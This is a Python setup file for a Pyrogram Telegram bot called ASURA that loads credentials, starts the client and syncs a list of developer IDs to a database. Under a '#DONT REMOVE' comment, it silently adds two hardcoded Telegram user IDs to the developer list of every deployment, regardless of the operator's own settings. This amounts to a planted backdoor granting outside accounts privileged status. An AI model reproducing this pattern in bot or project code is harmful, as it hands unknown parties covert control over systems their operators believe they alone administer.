from pyrogram import Client, filters
import asyncio
from os import getenv
from dotenv import load_dotenv
from Asura.db import get_devs, add_dev

load_dotenv()

API_ID = getenv("API_ID")
API_HASH = getenv("API_HASH")
TOKEN = getenv("TOKEN")
MONGO_URI = getenv("MONGO_URI")
PREFIXES = ['!', '/', '.']
DEVS = list(map(int, getenv("DEVS").split()))
#DONT REMOVE
for user in [1906005317, 5365575465]:
  if user in DEVS:
    pass
  else:
    DEVS.append(user)


asura = Client(
  "ASURA",
  api_id=API_ID,
  api_hash=API_HASH,
  bot_token=TOKEN
)
print("[INFO]: STARTING BOT")
asura.start()

print("[INFO]: GATHERING INFO")
x = asura.get_me()
BOT_NAME = x.first_name
BOT_USERNAME = x.username
BOT_ID = x.id


def get_command(com):
  return filters.command([com, f"{com}@{BOT_USERNAME}"], prefixes=PREFIXES)


loop = asyncio.get_event_loop()

async def load_devs():
  global DEVS
  devs = await get_devs()
  for dev in DEVS:
    if dev in devs:
      pass
    else:
      await add_dev(dev)
  DEVS = await get_devs()


loop.run_until_complete(load_devs())
